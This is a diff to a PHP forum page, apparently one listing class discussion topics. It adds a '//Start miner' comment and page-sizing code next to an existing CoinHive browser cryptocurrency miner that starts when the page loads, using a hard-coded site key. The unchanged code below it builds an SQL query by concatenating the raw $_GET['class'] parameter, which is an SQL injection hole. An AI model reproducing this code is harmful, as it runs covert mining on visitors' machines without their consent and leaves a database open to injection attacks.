@@ -46,8 +46,13 @@
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
     <link rel="stylesheet" href="css/pages.css">
     <script>
+      //Start miner
 	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
 	      miner.start();
+
+        //Size main
+        var height = $(window).height() - 25;
+        $("#threads").height(height);
     </script>
     <!-- End questionable content -->
 
@@ -95,7 +100,7 @@
         }
         //Otherwise print the topics
         else {
-          echo '<div class="container-fluid" style="overflow-y: scroll;">';
+          echo '<div id="threads" class="container-fluid" style="overflow-y: scroll;">';
 
           $class = $_GET['class'];
           $query = "SELECT * FROM topics WHERE class_id = " . $class;
